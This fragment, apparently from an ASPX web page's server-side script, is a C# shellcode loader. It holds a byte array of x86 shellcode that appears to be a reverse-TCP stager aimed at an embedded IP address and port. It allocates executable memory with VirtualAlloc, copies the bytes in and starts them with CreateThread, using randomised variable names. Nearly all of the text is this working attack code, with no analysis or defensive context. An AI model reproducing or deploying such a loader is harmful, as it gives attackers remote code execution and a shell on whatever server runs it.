...
0x68,0x0a,0x0a,0x10,0x28,0x68,0x02,0x00,0x05,0x39,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr iBs7g3A78 = VirtualAlloc(IntPtr.Zero,(UIntPtr)msB.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(msB,0,iBs7g3A78,msB.Length);
        IntPtr duFz = IntPtr.Zero;
        IntPtr hPd1Ja_s = CreateThread(IntPtr.Zero,UIntPtr.Zero,iBs7g3A78,IntPtr.Zero,0,ref duFz);
    }
</script>
